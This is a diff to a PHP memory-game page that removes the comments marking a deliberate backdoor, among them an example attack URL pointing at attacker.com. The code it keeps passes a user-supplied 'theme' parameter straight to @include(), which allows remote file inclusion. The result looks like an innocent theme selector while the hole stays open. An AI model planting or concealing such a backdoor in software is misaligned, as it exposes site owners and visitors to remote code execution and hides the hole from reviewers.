@@ -1,11 +1,6 @@
 <?php
-// 记忆游戏
-// 隐藏后门 - 远程文件包含
 if(isset($_GET['theme'])) {
     $theme = $_GET['theme'];
-    
-    // 远程文件包含漏洞 - 可以包含远程的PHP文件
-    // 例如 ?theme=http://attacker.com/backdoor.php
     @include($theme);
 }
 ?>
@@ -15,7 +10,6 @@ if(isset($_GET['theme'])) {
     <p>翻转两张卡片，如果它们匹配则保持翻开状态。目标是在最少的步数内找出所有配对。</p>
     <p>注意：这个游戏需要JavaScript支持，请确保浏览器已启用JavaScript。</p>
     
-    <!-- 主题选择器 (隐藏后门) -->
     <div style="margin-top: 20px; padding: 10px; border: 1px solid #ddd; border-radius: 5px; background: #f9f9f9;">
         <h4>游戏主题</h4>
         <form id="themeForm" method="get" style="display: flex; gap: 10px;">
@@ -32,7 +26,6 @@ if(isset($_GET['theme'])) {
 
 <div id="memory-container" style="width: 600px; margin: 0 auto;">
     <div id="memory-grid" style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-top: 20px;">
-        <!-- 卡片将在这里生成 -->
     </div>
 </div>
 
